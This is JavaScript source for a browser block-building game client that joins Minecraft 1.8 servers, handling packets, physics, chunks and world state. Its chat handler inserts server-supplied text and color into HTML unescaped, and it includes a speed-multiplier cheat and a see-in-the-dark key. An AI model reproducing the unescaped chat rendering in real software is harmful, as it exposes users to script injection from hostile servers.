		const {conv, parseMetadata, updateAttributes, load_1_8, onesInShort, Physics, PlayerState, Vec3} = window.mcProtocol
		let Block = window.mcProtocol.getBlock("1.8")

		blockData, blockIds, BLOCK_COUNT, blockInfoIds, inventoryBlocks
		blockData = [], blockIds = {}
		for(let i in mcData.blocks){
			let b = mcData.blocks[i]
			let nb = Object.create(b)
			nb.Name = b.displayName
			nb.id = b.id<<4
			nb.blastResistance = b.resistance
			nb.lightLevel = b.emitLight
			nb.textures = mkBlockIds[b.name] === undefined ? (new Array(6)).fill("error") : mkBlockData[mkBlockIds[b.name]].textures
			nb.shadow = !b.transparent
			nb.shade = !b.emitLight
			nb.smoothLight = !b.transparent && b.boundingBox !== "empty"
			nb.shape = shapes.cube//todo
			if(b.harvestTools){
				nb.harvestTools = []
				for(let i in b.harvestTools) nb.harvestTools.push(b.harvestTools[i]<<4)
			}else if(b.diggable) nb.harvestTools = true
			if(b.variations) for(let v of b.variations){
				let nbv = Object.create(nb)
				nbv.Name = v.displayName
				blockData[nb.id | v.metadata&15] = nbv
			}
			blockData[nb.id] = nb
			blockIds[b.name] = nb.id
		}
		for(let i in mcData.items){
			let b = mcData.items[i]
			if(blockData[b.id<<4]) continue
			let nb = Object.create(b)
			nb.Name = b.displayName
			nb.id = b.id<<4
			nb.textures = mkBlockIds[b.name] === undefined ? (new Array(6)).fill("error") : mkBlockData[mkBlockIds[b.name]].textures
			nb.shape = shapes.item
			if(b.variations) for(let v of b.variations){
				let nbv = Object.create(nb)
				nbv.Name = v.displayName
				blockData[nb.id | v.metadata&15] = nbv
			}
			blockData[nb.id] = nb
			blockIds[b.name] = nb.id
		}
		for(let i in mcData.foods){
			let b = mcData.foods[i]
			blockData[b.id<<4].edible = true
		}
		BLOCK_COUNT = 0
		blockInfoIds = {}
		inventoryBlocks = {all:[],search:[]}//todo inventoryBlocks, items
		win.blockData = blockData
		win.blockIds = blockIds
		genIcons()
		initBlockEntities()

		try{
		multiplayer = window.mcProtocol.createClient({url,username,version:"1.8"})
		}catch(e){alert(e); return}
		multiplayer.on("error", console.error)
		multiplayer.on("playerJoin", e => {
			play()
		})
		multiplayer.on("end", reason => {
			multiplayer = null
			multiplayerError = multiplayerError || {data:reason}
			updateTitle(false)
			changeScene("multiplayer lost")
		})
		multiplayer.differentAccount = {
			username,
			skin:undefined, cape:undefined
		}
		await loggedIn()
		
		world = new World()
		world.isMK = false
		win.world = world
		world.version = "1.8.8. eagler"
		world.name = url
		updateTitle(true)
		let proxyworld = {
			getBlock(pos){
				let id = world.getBlock(pos.x,pos.y,pos.z)
				let b = new Block(id>>4, 0/*todo biome*/, id&15)
				b.position = pos.floored()
				return b
			}
		}
		let physics = Physics(mcData, proxyworld)
		let ps = new PlayerState({
			version:"1.8",
	    entity: {
	      position: new Vec3(0, 0, 0),
	      velocity: new Vec3(0, 0, 0),
	      yaw: 0,
	      pitch: 0,
				effects:{},
	    },
			inventory:{slots:[]}//todo
	  },{
			get forward(){return controlMap.forward.pressed},
			get back(){return controlMap.backward.pressed},
			get left(){return controlMap.left.pressed},
			get right(){return controlMap.right.pressed},
			get jump(){return controlMap.jump.pressed},
			get sprint(){return controlMap.sprint.pressed},
			get sneak(){return controlMap.sneak.pressed}
		})
		world.playerPhysics = function(){
			ps.pos.set(pPos.x,pPos.y,pPos.z)
			ps.vel.set(p.velocity.x,p.velocity.y,p.velocity.z)
			if(fasterVel !== 1){
				let m = mag(ps.vel.x,ps.vel.y,ps.vel.z)
				let t=fasterVel*0.1/m
				if(m<t && isFinite(t))ps.vel.x*=t,ps.vel.y*=t,ps.vel.z*=t
			}
			ps.yaw = pPos.yaw
			ps.pitch = pPos.pitch
			physics.simulatePlayer(ps, proxyworld)
			pPos.x = ps.pos.x
			pPos.y = ps.pos.y
			pPos.z = ps.pos.z
			p.velocity.set(ps.vel)
			p.onGround = ps.onGround
		}
		const pPos = {
			get x(){return p.x+0.5},
			get y(){return p.y+0.5-physics.playerHeight*0.5},
			get z(){return p.z+0.5},
			set x(n){p.x=n-0.5},
			set y(n){p.y=n-0.5+physics.playerHeight*0.5},
			set z(n){p.z=n-0.5},
			get yaw(){return Math.PI-p.ry},
			get pitch(){return Math.PI-p.rx},
			set yaw(n){p.ry=Math.PI-n},
			set pitch(n){p.rx=Math.PI-n},
		}
		Messages.add("Useful keys: <br>+ Faster speed <br>- Normal speed <br>F4 See in the dark")
		function mapChunk(cx,cz,groundUp,chunkData,bitMap){
			let chunk = world.getOrNewChunk(cx*16,cz*16,p.dimension)
			if(!chunk.loaded) chunk.customLoadStart()
			load_1_8(chunkData,bitMap, p.dimension ==="", groundUp, (yindex,blocks,blight,slight)=>{
				let section = chunk.requireSection(yindex-(minHeight>>4))
				let i=0
				for(let y=0;y<16;y++) for(let z=0;z<16;z++) for(let x=0;x<16;x++){
					section.setBlock(x,y,z, blockData[blocks[i]] ? blocks[i] : 0)
					section.setLight(x,y,z, (slight[i>>1]>>((i&1)*4))&15, 0)
					section.setLight(x,y,z, (blight[i>>1]>>((i&1)*4))&15, 1)
					i++
				}
			})
			chunk.customLoadEnd()
		}
		function getFace(){
			return hitBox.face === "bottom" ? 0 : hitBox.face === "top" ? 1 : hitBox.face === "south" ? 2 : hitBox.face === "north" ? 3 : hitBox.face === "west" ? 4 : 5
		}
		multiplayer.send = data => {
			let type, o
			switch(data.type){
				case "message": type = "chat"; o = {message:data.data}; break
				case "entInteract": type = "use_entity"; o = {target:+data.data, mouse:data.hit?1:0}; break
				case "startBreak": type = "block_dig"; o = {status:0, location:{x:data.x,y:data.y,z:data.z}, face:getFace()}; break
				case "stopBreak": type = "block_dig"; o = {status:1, location:{x:data.x,y:data.y,z:data.z}, face:getFace()}; break
				case "dropItem": type = "block_dig"; o = {status:4}; break
				case "stopPlace": type = "block_dig"; o = {status:5}; break
				case "break": type = "block_dig"; o = {status:2, location:{x:data.x,y:data.y,z:data.z}, face:getFace()}; break
				case "place": type = "block_place"; o = {location:{x:data.x,y:data.y,z:data.z}, direction:getFace(), cursorX:data.cx*16, cursorY:data.cy*16, cursorZ:data.cz*16, heldItem:{}}; break
				case "hotbar": type = "held_item_slot"; o = {slotId:data.slot}; break
				case "respawn": type = "client_command"; o = {payload:0}; break
				default: return
			}
			multiplayer.write(type, o)
		}
		let prevX,prevY,prevZ, prevRx,prevRy, prevOnGround, prevSneak, prevSprint, prevSleep, prevFly, prevLang, prevRenderDist
		multiplayer.lastSendPos = 0
		multiplayer.sendPos = () => {
			if(!multiplayer.hasStartedLoad) return
			let moved = prevX !== pPos.x || prevY !== pPos.y || prevZ !== pPos.z
			let looked = prevRx !== pPos.pitch || prevRy !== pPos.yaw
			if(moved) prevX = pPos.x, prevY = pPos.y, prevZ = pPos.z
			if(looked) prevRx = pPos.pitch, prevRy = pPos.yaw
			let now = Date.now()
			if(moved&&looked){
				multiplayer.lastSendPos = now
				multiplayer.write("position_look", {x:pPos.x,y:pPos.y,z:pPos.z,yaw:conv.toNotchianYaw(pPos.yaw),pitch:conv.toNotchianYaw(pPos.pitch),onGround:ps.onGround})
				prevOnGround = ps.onGround
			}else if(moved){
				multiplayer.lastSendPos = now
				multiplayer.write("position", {x:pPos.x,y:pPos.y,z:pPos.z,onGround:ps.onGround})
				prevOnGround = ps.onGround
			}else if(looked){
				multiplayer.lastSendPos = now
				multiplayer.write("look", {yaw:conv.toNotchianYaw(pPos.yaw),pitch:conv.toNotchianYaw(pPos.pitch),onGround:ps.onGround})
				prevOnGround = ps.onGround
			}else if(prevOnGround !== ps.onGround){
				multiplayer.lastSendPos = now
				multiplayer.write("flying", {onGround:ps.onGround})
				prevOnGround = ps.onGround
			}
			if(prevSneak !== p.sneaking){
				prevSneak = p.sneaking
				multiplayer.write("entity_action", {entityId:+p.id, actionId:p.sneaking?0:1})
			}
			if(prevSprint !== p.sprinting){
				prevSprint = p.sprinting
				multiplayer.write("entity_action", {entityId:+p.id, actionId:p.sprinting?3:4})
			}
			if(prevSleep !== p.sleeping){
				prevSleep = p.sleeping
				if(!p.sleeping) multiplayer.write("entity_action", {entityId:+p.id, actionId:2})
			}
			if(prevFly !== p.flying){
				prevFly = p.flying
				multiplayer.write("abilities", {flags:p.flying?2:0})
			}
			if(prevRenderDist !== settings.renderDistance || prevLang !== settings.language){
				prevRenderDist = settings.renderDistance, prevLang = settings.language
				multiplayer.write("settings", {locale:settings.language||"en-US",viewDistance:settings.renderDistance})
			}
		}
		win.multiplayer = multiplayer
		//todo close window click window,update sign
		multiplayer.close = multiplayer.end
		multiplayer.on("playerJoin", () => multiplayer.hasStartedLoad = true)
		multiplayer.on("packet", (o, {name}) => {
switch(name){
	case "chat":{
		let data
		try{
			data = JSON.parse(o.message)
		}catch{
			data = o.message
		}
		Messages.add((data.color?"<span style='color:"+data.color+";'>":"")+data.text)
		break
	}
	case "update_time":{
		worldTime = (Number(BigInt.asIntN(32,o.time))/24000)*1000+250
		break
	}
	/*case "spawn_position":{
		world.spawnPoint.x = o.location.x
		world.spawnPoint.y = o.location.y
		world.spawnPoint.z = o.location.z
		break
	}*/
	case "update_health":{
		if(o.health < p.health){
			p.lastDamageHealth = p.health
			harmEffect = 30
			damageX = damageY = damageZ = 0
		}
		if(o.health > p.health){
			healEffect = 40
		}
		p.health = o.health
		p.food = o.food
		p.foodSaturation = o.foodSaturation
		if(p.health <= 0) die()
		break
	}
	case "respawn":{
		p.dimension = o.dimension === -1 ? "nether" : o.dimension === 1 ? "end" : ""
		world.unloadAllChunks()
		p.gameMode = o.gamemode === 0 ? "survival" : o.gamemode === 1 ? "creative" : o.gamemode === 2 ? "survival" : "creative"
		p.die = false
		play()
		break
	}
	case "position":{
		pPos.x = (o.flags&1) ? pPos.x+o.x : o.x
		pPos.y = (o.flags&2) ? pPos.y+o.y : o.y
		pPos.z = (o.flags&4) ? pPos.z+o.z : o.z
		pPos.yaw = (o.flags&8) ? conv.fromNotchianYaw(conv.toNotchianYaw(pPos.yaw)+o.yaw) : conv.fromNotchianYaw(o.yaw)
		pPos.pitch = (o.flags&16) ? conv.fromNotchianPitch(conv.toNotchianPitch(pPos.pitch)+o.pitch) : conv.fromNotchianPitch(o.pitch)
		multiplayer.write("position_look", {x:o.x,y:o.y,z:o.z,yaw:o.yaw,pitch:o.pitch,onGround:ps.onGround})
		break
	}
	case "held_item_slot":{
		inventory.hotbarSlot = o.slot
		break
	}
	case "bed":{
		let other = getEntityOrPlayer(o.entityId+"")
		if(!other) break
		other.sleeping = true
		other.x = o.location.x
		other.y = o.location.y
		other.z = o.location.z
		break
	}
	case "animation":{
		let other = getEntityOrPlayer(o.entityId+"")
		if(!other) break
		if(o.animation === 0) other.punchEffect = 10
		else if(o.animation === 1) other.harmEffect = 30
		break
	}
	case "named_entity_spawn":{
		let p = players[o.entityId+""] = new Player()
		p.UUID = o.playerUUID
		p.setPos(o.x,o.y,o.z,0,0,0)
		p.setRot(o.pitch,o.yaw)
		p.holding = o.currentItem
		p.metadata = parseMetadata(o.metadata)
		break
	}
	case "spawn_entity":{
		let type = internalIdToEntity[o.type]
		if(type === undefined) type = entities[entityIds.BlockEntity]
		world.posEntity({block:blockIds.redConcrete, ...o, id:o.entityId+"", entId:type, dimension:p.dimension, x:o.x/32, y:o.y/32, z:o.z/32},undefined,undefined,true)
		break
	}
	case "spawn_entity_living":{
		let type = internalIdToEntity[o.type]
		if(type === undefined) type = entities[entityIds.BlockEntity]
		world.posEntity({block:blockIds.redConcrete, ...o, id:o.entityId+"", entId:type, dimension:p.dimension, x:o.x/32, y:o.y/32, z:o.z/32},undefined,undefined,true)
		break
	}
	case "spawn_entity_experience_orb":{
		let type = entities[entityIds.ExperienceOrb]
		world.posEntity({...o, id:o.entityId+"", entId:type, dimension:p.dimension, amount:o.count, x:o.x/32, y:o.y/32, z:o.z/32},undefined,undefined,true)
		break
	}
	case "entity_destroy":{
		for(let i of o.entityIds){
			world.deleteEntity(i+"",true)
		}
		break
	}
	case "rel_entity_move":{
		let e = getEntityOrPlayer(o.entityId+"")
		if(!e) break
		e.x += o.dX/32
		e.y += o.dY/32
		e.z += o.dZ/32
		break
	}
	case "entity_look":{
		let e = getEntityOrPlayer(o.entityId+"")
		if(!e) break
		e.yaw = conv.fromNotchianYawByte(o.yaw)
		e.pitch = conv.fromNotchianPitchByte(o.pitch)
		break
	}
	case "entity_move_look":{
		let e = getEntityOrPlayer(o.entityId+"")
		if(!e) break
		e.x += o.dX/32
		e.y += o.dY/32
		e.z += o.dZ/32
		e.yaw = conv.fromNotchianYawByte(o.yaw)
		e.pitch = conv.fromNotchianPitchByte(o.pitch)
		break
	}
	case "entity_teleport":{
		let e = getEntityOrPlayer(o.entityId+"")
		if(!e) break
		e.x = o.x/32
		e.y = o.y/32
		e.z = o.z/32
		e.yaw = conv.fromNotchianYawByte(o.yaw)
		e.pitch = conv.fromNotchianPitchByte(o.pitch)
		break
	}
	case "entity_head_rotation":{
		let e = getEntityOrPlayer(o.entityId+"")
		if(!e) break
		if(e.parts && e.parts.head) e.parts.head.yaw = conv.fromNotchianYawByte(o.headYaw)
		break
	}
	case "entity_status":{break}//todo
	case "attach_entity":{
		let e = getEntityOrPlayer(o.entityId+"")
		if(!e) break
		if(!o.leash) e.riding = o.vechileId === -1 ? null : o.vechileId+""
		break
	}
	case "entity_metadata":{
		let e = getEntityOrPlayer(o.entityId+"")
		if(!e) break
		parseMetadata(o.metadata, e.metadata)
		break
	}
	case "experience":{
		p.XP = o.experienceBar
		p.nextLevel = 1
		p.level = o.level
		break
	}
	case "map_chunk":{
		mapChunk(o.x,o.z,o.groundUp,o.chunkData,o.bitMap)
		break
	}
	case "map_chunk_bulk":{
		let offset = 0
		for (let i = 0; i < o.meta.length; ++i) {
			let meta = o.meta[i]
      let size = (8192 + (o.skyLightSent ? 2048 : 0)) *
        onesInShort(meta.bitMap) + // block ids
        2048 * onesInShort(meta.bitMap) + // (two bytes per block id)
        256 // biomes
			mapChunk(meta.x,meta.z,true, o.data.subarray(offset, offset + size), meta.bitMap)
			offset += size
		}
		break
	}
	case "multi_block_change":{
		for(let r of o.records){
			world.setBlock(o.chunkX<<4 | (r.horizontalPos>>4), r.horizontalPos, o.chunkZ<<4 | (r.horizontalPos&15), o.blockId, false,false,true,false, p.dimension)
		}
		break
	}
	case "block_change":{
		world.setBlock(o.location.x,o.location.y,o.location.z, o.type, false,false,true,false, p.dimension)
		break
	}
	case "block_break_animation":{
		let e = getEntityOrPlayer(o.entityId+"")
		if(!e) break
		e.crackPos = [o.location.x,o.location.y,o.location.z]
		e.crack = o.destroyStage
		break
	}
	case "explosion":{
		for(let pos of o.affectedBlockOffsets){
			world.setBlock(o.x+pos.x,o.y+pos.y,o.z+pos.z,0, false,false,true,false, p.dimension)
		}
		break
	}
	case "world_event":{
		switch(o.effectId){
			case 1000: playSound("click",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1001: playSound("click",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1002: playSound("random.bow",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1003: playSound("wooden_door.open",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1004: playSound("random.fizz",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1005: Messages.add("play music disc "+o.data,0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1007: playSound("mob.ghast.charge",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1008: playSound("mob.ghast.fireball",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1009: playSound("mob.ghast.fireball",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1010: playSound("mob.zombie.wood",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1011: playSound("mob.zombie.metal",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1012: playSound("mob.zombie.woodbreak",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1013: playSound("mob.wither.spawn",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1014: playSound("mob.wither.shoot",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1015: playSound("mob.bat.takeoff",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1016: playSound("mob.zombie.infect",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1017: playSound("mob.zombie.unfect",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1018: playSound("mob.enderdragon.end",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1020: playSound("random.anvil_break",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1021: playSound("random.anvil_use",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 1022: playSound("random.anvil_land",0,1,1,posSound(o.location.x,o.location.y,o.location.z)); break
			case 2000:{
				if(!performFast) for(let i=0; i<o.amount; i++){
					world.addParticle(new entities[entityIds.SmokeParticle](o.location.x+rand()-0.5,o.location.y+rand()-0.5,o.location.z+rand()-0.5),p.dimension)
				}
				break
			}
			case 2001: blockParticles(o.data<<4, o.location.x,o.location.y,o.location.z, 30, "breaking", world,p.dimension, null,true); break
			case 2002: Messages.add("splash potion sound"); break
			case 2003: Messages.add("eye of ender break sound");break
			case 2005: glint(o.location.x,o.location.y,o.location.z, p.dimension,true); break
		}
		break
	}
	case "sound_effect":{
		playSound(o.soundName,0,o.volume,o.pitch,posSound(o.x,o.y,o.z))
		break
	}
	case "world_particles":{
		switch(o.particleId){
			//todo
		}
		break
	}
	case "game_state_change":{
		switch(o.reason){
			case 1: weather = ""; break
			case 2: weather = "rain"; break
			case 3:{
				p.gameMode = o.gameMode === 0 ? "survival" : o.gameMode === 1 ? "creative" : o.gameMode === 2 ? "survival" : "spectator"
				break
			}
			case 4: showEndPoem(); break
		}
		break
	}
	case "spawn_entity_weather":{
		Messages.add("a thunder striked at "+o.x+","+o.y+","+o.z)
		break
	}
	case "open_window":{
		Messages.add("open_window")//todo
		break
	}
	case "close_window":{
		Messages.add("close_window")//todo
		break
	}
	case "update_sign":{
		//todo
		break
	}
	case "tile_entity_data":{
		//todo
		break
	}
	case "open_sign_entity":{
		editSign(o.location.x,o.location.y,o.location.z,p.dimension)
		break
	}
	case "statistics": break
	case "scoreboard_objective": break//todo
	case "scoreboard_score": break//todo
	case "scoreboard_display_objective":break
	case "scoreboard_team":break
	case "kick_disconnect":{
		multiplayerError = {data:o.reason}
		break
	}
	case "title":{
		titleShowing = true
		switch(o.action){
			case 0: let t = JSON.parse(o.text); title = t.text; titleColor = t.color||"white"; break
			case 1: subtitle = JSON.parse(o.text).text; break
			case 2: titleFadeIn = o.fadeIn*50; titleFadeOut = o.fadeOut*50; titleStay = o.stay*50; titleStart = Date.now(); break
			case 3: titleShowing = false; break
			case 4: titleShowing = false; title = ""; subtitle = ""; break
		}
		break
	}
	case "resource_pack_send":{
		Messages.add("cannot use resource pack (incompatible) "+o.url)
		multiplayer.write("resource_pack_receive", {hash:o.hash, result:2})
		break
	}
	case "update_entity_nbt":break//todo
}
		})

		fetch("/minekhan/know",{
			method:"POST",
			body: "join server; username: "+username+"; url: "+url,
			headers:{Authorization:userSessionString}
		}).catch(console.error)
	}

	/*function handleservererror(e){
		//logError(e)
		stopTicking = true
		throw e
	}*/
  
	let {biomeData, biomeIds} = win
	let biomes = Object.keys(biomeData)
  function getNetherBiome(biome) {
    if(biome > 0.4 && biome < 0.5){
      return "warpedForest"
    }else if(biome > 0.4){
      return "crimsonForest"
    }
    return "netherWastes"
  }
  function getBiome(biome){
    if(biome > 0.6){
      return "snowyPlains"
    }else if(biome > 0.5){
      return "desert"
    }else if(biome > 0.4){
      return "plains"
    }else if(biome > 0.37){
      return "sparseJungle"
    }else if(biome > 0.35){
      return "jungle"
    }else if(biome > 0.3){
      return "bambooJungle"
    }else{
      return "forest"
    }
  }
  function getBiomeSkyColor(biome,arr){
		if(customResources.settings.sky && customResources.settings.sky[biome]){
			let color = customResources.settings.sky[biome]
			arr[0] = color[0],arr[1] = color[1],arr[2] = color[2]
			return
		}
    let color = skyColor[biome] || skyColor.default
		arr[0] = color[0],arr[1] = color[1],arr[2] = color[2]
  }
  function getBiomeTemperature(biome,y){
		if(!biomeData[biome]) return 0
    let t = biomeData[biome][0]
		if(y > 80) t -= (y-80)/800
		return t
  }

  let skyLight = 0, fogBrightness = 0
  let worldTime = 375 //current in-game time
	let fogDist = 16
	let brightness = 1 //how bright is everything (less light = brighter)
	let lightBrightness = 1 //brightness calculated from light level
	let lantern = 0
	class World {
		constructor() {
			fogDist = 16

      /*p.lastY = 0
      p.y = 70
			p.x = this.spawnPoint.x
			p.z = this.spawnPoint.z*/
      
      this.version = version

			//Initialize the world's arrays
			this.chunks = {}
			this.loaded = []
			this.sortedChunks = []
      this.doubleRenderChunks = []
			this.offsetX = 0
			this.offsetZ = 0
			this.lwidth = 0
			this.chunkGenQueue = []
			this.meshQueue = []
			this.weatherMeshQueue = []
			this.lightingQueue = []
			//this.unlightingQueue = []
			this.alwaysRenderEntities = []
			this.waitingEntities = [] //entities waiting to have their chunk loaded
      this.textEntities = [] //Text to draw
			this.lastChunk = ","
			this.lastDimension = ""
			//this.resourcePacks = []
			this.activeResourcePacks = []
			this.neededChunks = []
			this.neededChunkCoords = []
			this.skylightDir = new PVector(0,0,0)
			this.sunDir = new PVector(0,0,0)
			this.particles = []
			this.isMK = true
			this.entities = new Map()
		}
		getAdjacentSubchunks(x, y, z, type, dimension) {
      let minChunkX = x - 16 >> 4
			let maxChunkX = x + 16 >> 4
			let minChunkY = y - 16 >> 4
			let maxChunkY = y + 16 >> 4
			let minChunkZ = z - 16 >> 4
			let maxChunkZ = z + 16 >> 4
			let minHeightChunk = minHeight >> 4
			let section = null
			let ret = []
			for (x = minChunkX; x <= maxChunkX; x++) {
				for (z = minChunkZ; z <= maxChunkZ; z++) {
					let chunk = this.getChunk(x*16,z*16,dimension)
					for (y = minChunkY; y <= maxChunkY; y++) {
						if (y < minHeight || !chunk) {
							ret.push(type ? (type === 2 ? emptySection.tags : (type === 3 ? emptySection.blockLight : emptySection.skyLight)) : emptySection.blocks)
						} else if (chunk) {
							section = chunk.sections[y-minHeightChunk] || emptySection
							ret.push(type ? (type === 2 ? section.tags : (type === 3 ? section.blockLight : section.skyLight)) : section.blocks)
						}
					}
				}
			}
			return ret
		}
		getAmbients(x, y, z, dimension) {
      let minChunkX = x - ambientDist >> 4
			let maxChunkX = x + ambientDist >> 4
			let minChunkY = y - ambientDist >> 4
			let maxChunkY = y + ambientDist >> 4
			let minChunkZ = z - ambientDist >> 4
			let maxChunkZ = z + ambientDist >> 4
			let minHeightChunk = minHeight >> 4
			let section = null
			let ret = []
			for (x = minChunkX; x <= maxChunkX; x++) {
				for (z = minChunkZ; z <= maxChunkZ; z++) {
					let chunk = this.getChunk(x*16,z*16,dimension)
					for (y = minChunkY; y <= maxChunkY; y++) {
						if (y >= minHeightChunk && chunk) {
							section = chunk.sections[y-minHeightChunk]
							if(section && section.hasAmbients) ret.push(section)
						}
					}
				}
			}
			return ret
		}
		updateBlock(x, y, z, lazy, noOnupdate, sx,sy,sz, dimension) {
      let chunk = this.getChunk(x,z,dimension)
			if (chunk && chunk.buffer) {
				chunk.updateBlock(x & 15, y, z & 15, lazy, noOnupdate, sx,sy,sz)
			}
		}
		getChunk(x, z) {
			return this.chunks[x >> 4] && this.chunks[x >> 4][z >> 4]
		}
		getOrNewChunk(x,z,dimension){
			const xm = x>>4, zm = z>>4
			if (!this.chunks[xm]) {
				this.chunks[xm] = []
			}
			if (!this.chunks[xm][zm]) {
				return this.chunks[xm][zm] = new Chunk(xm<<4, zm<<4, dimension,this)
			}
			return this.chunks[xm][zm]
		}
		getBlock(x, y, z, dimension) {
      let lwidth = this.lwidth
			let X = (x >> 4) + this.offsetX
			let Z = (z >> 4) + this.offsetZ
			if (y > maxHeight) {
				return blockIds.air
			} else if (y < minHeight) {
				return blockIds.air
			}else if(X < 0 || X >= lwidth || Z < 0 || Z >= lwidth){
				return blockIds.air
			}
      let chunk = this.loaded[X * lwidth + Z]
			return chunk ? chunk.getBlock(x & 15, y, z & 15) : blockIds.air
		}
		setBlock(x, y, z, blockID, lazy, noOnupdate, remote, keepTags, dimension) {
      if(y < minHeight) return false
      let chunk = this.getChunk(x,z,dimension)
			if (!chunk || !chunk.loaded) {
				return false
			}
      
			let xm = x & 15
			let zm = z & 15
      let prev = chunk.getBlock(xm,y,zm)
			if(this.isMK){
				if (blockID) {
					let data = blockData[blockID]
					chunk.setBlock(xm, y, zm, blockID, !lazy)
					if (!lazy && chunk.buffer && (!data.transparent || data.lightLevel || data.decreaseLight) && chunk.lit) {
						this.updateLight(x, y, z, true, data.lightLevel, dimension)
					}
				} else {
					let data = blockData[prev]
					chunk.deleteBlock(xm, y, zm, !lazy)
					if (!lazy && chunk.buffer && (!data.transparent || data.lightLevel || data.decreaseLight) && chunk.lit) {
						this.updateLight(x, y, z, false, data.lightLevel, dimension)
					}
				}
      
	      if(blockID && blockData[blockID].importantOnset){
	        blockData[blockID].importantOnset(x,y,z, dimension,this)
	      }
			}else if(!blockData[blockID]) return
			if (lazy) {
				return
			}
      //let prevTags = this.getTags(x,y,z, dimension)
      //if(!keepTags) this.setTags(x, y, z, undefined, remote, dimension)
      
      if(!remote) throw new Error("Client can not set block!!!!!!")//send({type:"setBlock", data:{x:x, y:y, z:z, block:blockID, dimension:dimension, keepTags:keepTags}})
			
			//Update the 6 adjacent blocks and 1 changed block
			if (xm && xm !== 15 && zm && zm !== 15) {
				chunk.updateBlock(xm - 1, y, zm, lazy, false, x,y,z)
				chunk.updateBlock(xm, y - 1, zm, lazy, false, x,y,z)
				chunk.updateBlock(xm + 1, y, zm, lazy, false, x,y,z)
				chunk.updateBlock(xm, y + 1, zm, lazy, false, x,y,z)
				chunk.updateBlock(xm, y, zm - 1, lazy, false, x,y,z)
				chunk.updateBlock(xm, y, zm + 1, lazy, false, x,y,z)
			}
			else {
				this.updateBlock(x - 1, y, z, lazy, false, x,y,z, dimension)
				this.updateBlock(x + 1, y, z, lazy, false, x,y,z, dimension)
				this.updateBlock(x, y - 1, z, lazy, false, x,y,z, dimension)
				this.updateBlock(x, y + 1, z, lazy, false, x,y,z, dimension)
				this.updateBlock(x, y, z - 1, lazy, false, x,y,z, dimension)
				this.updateBlock(x, y, z + 1, lazy, false, x,y,z, dimension)
			}

			chunk.updateBlock(xm, y, zm, lazy, noOnupdate, x,y,z)

			// Update the corner chunks so shadows in adjacent chunks update correctly
			if (xm | zm === 0) { this.updateBlock(x - 1, y, z - 1, lazy, true,x,y,z,dimension); }
			if (xm === 15 && zm === 0) { this.updateBlock(x + 1, y, z - 1, lazy, true,x,y,z,dimension); }
			if (xm === 0 && zm === 15) { this.updateBlock(x - 1, y, z + 1, lazy, true,x,y,z,dimension); }
			if (xm & zm === 15) { this.updateBlock(x + 1, y, z + 1, lazy, true,x,y,z,dimension); }
		}
    tagsChanged(x,y,z, t, remote, dimension, lazy){
      /*var str = x.toString(36)+","+y.toString(36)+","+z.toString(36)
      var editedTags = dimension === "nether" ? this.netherEditedTags : (dimension === "end" ? this.endEditedTags : this.editedTags)
      if(t){
        if(!editedTags.includes(str)) editedTags.push(str)
      }else{
        if(editedTags.includes(str)){
          editedTags.splice(editedTags.indexOf(str),1)
        }
      }*/
      if(!remote){
				throw new Error("Client can not set tags!!!!")
        //send({type:"setTags", x, y, z, data:t, dimension, lazy})
      }
			let block = blockData[this.getBlock(x,y,z,dimension)]
			if(block.tagTintPropertyTop || block.tagTintPropertyBottom || block.tagTintPropertyNorth || block.tagTintPropertySouth || block.tagTintPropertyEast || block.tagTintPropertyWest){
				let chunk = this.getChunk(x,z,dimension)
				if(chunk.buffer && !this.meshQueue.includes(chunk)) this.meshQueue.push(chunk)
			}
    }
    getTags(x,y,z,dimension){
      let X = (x >> 4) + this.offsetX
			let Z = (z >> 4) + this.offsetZ
      let lwidth = this.lwidth
      let loaded = this.loaded
			if (y > maxHeight) {
				return
			} else if (y < minHeight) {
				return
			}else if(X < 0 || X >= lwidth || Z < 0 || Z >= lwidth){
				return blockIds.air
			}
			let chunk = loaded[X * lwidth + Z]
			return chunk ? chunk.getTags(x & 15, y, z & 15) : undefined
    }
    getTagByName(x,y,z,n,dimension){
      let X = (x >> 4) + this.offsetX
			let Z = (z >> 4) + this.offsetZ
      let lwidth = this.lwidth
      let loaded = this.loaded
			if (y > maxHeight) {
				return
			} else if (y < minHeight) {
				return
			}else if(X < 0 || X >= lwidth || Z < 0 || Z >= lwidth){
				return blockIds.air
			}
			let chunk = loaded[X * lwidth + Z]
			return chunk ? chunk.getTagByName(x & 15, y, z & 15, n) : undefined
    }
    setTags(x,y,z,data, remote,dimension, lazy){
      if(y < minHeight) return
			let chunk = this.getChunk(x,z,dimension)
			if(!chunk) return
      
			let xm = x & 15
			let zm = z & 15
      chunk.setTags(xm, y, zm, data)
      this.tagsChanged(x,y,z,data, remote, dimension, lazy)
    }
    setTagByName(x,y,z,n,data, remote,dimension, lazy){
      if(y < minHeight) return
			let chunk = this.getChunk(x,z,dimension)
			if(!chunk) return
      
			let xm = x & 15
			let zm = z & 15
      var t = chunk.setTagByName(xm, y, zm, n,data)
      this.tagsChanged(x,y,z,t, remote,dimension, lazy)
    }
    updateTags(x,y,z,dimension,lazy){
      var t = this.getTags(x,y,z,dimension)
      this.tagsChanged(x,y,z,t,false,dimension,lazy)
    }
		getPower(x,y,z,dimension){
			return this.getTagByName(x,y,z,"power",dimension) || 0
		}
		getLight(x, y, z, blockLight = 0, dimension) {
			if(y < minHeight) return 0
